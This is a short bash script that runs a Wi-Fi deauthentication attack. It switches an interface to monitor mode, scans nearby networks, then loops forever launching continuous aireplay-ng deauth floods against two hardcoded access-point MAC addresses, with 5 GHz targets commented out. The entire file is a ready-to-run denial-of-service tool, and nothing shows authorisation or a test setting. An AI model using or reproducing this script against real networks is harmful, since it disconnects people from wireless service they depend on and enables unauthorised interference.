DEAUTH_PACKETS_NUM=0
#INTERFACE="wlan1mon"
INTERFACE="$1"
SLEEP_INTERVAL="20"

# 2.4 G
MAC1="74:DA:88:C2:C6:4C"
MAC2="68:14:01:3B:5B:8C"

# 5 G
MAC3="74:DA:88:C2:C6:4E"
MAC4="68:14:01:3B:5B:8D"

# Step 1
echo -n ">>> Putting $INTERFACE to monitormode"
airmon-ng start $INTERFACE
echo "...done"


echo -n ">>> Scan  wifi network around $INTERFACE mon"
airodump-ng $INTERFACE
echo "...done"

#Step 2
airodump-ng -d $MAC1 -c 1 $INTERFACE --ignore-negative-one 
airodump-ng -d $MAC2 -c 1 $INTERFACE --ignore-negative-one
#airodump-ng -d $MAC3 -c 30 $INTERFACE
#airodump-ng -d $MAC4 -c 30 $INTERFACE


#Step 3
while [ 1 ]
do
	# 2.4 G
	aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC1 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
	#sleep $SLEEP_INTERVAL
	aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC2 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
      	#sleep $SLEEP_INTERVAL

	# 5 G
	#aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC3 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
	#sleep $SLEEP_INTERVAL
	#aireplay-ng -o $DEAUTH_PACKETS_NUM -a $MAC4 $INTERFACE --deauth $DEAUTH_PACKETS_NUM &
      	sleep $SLEEP_INTERVAL
done

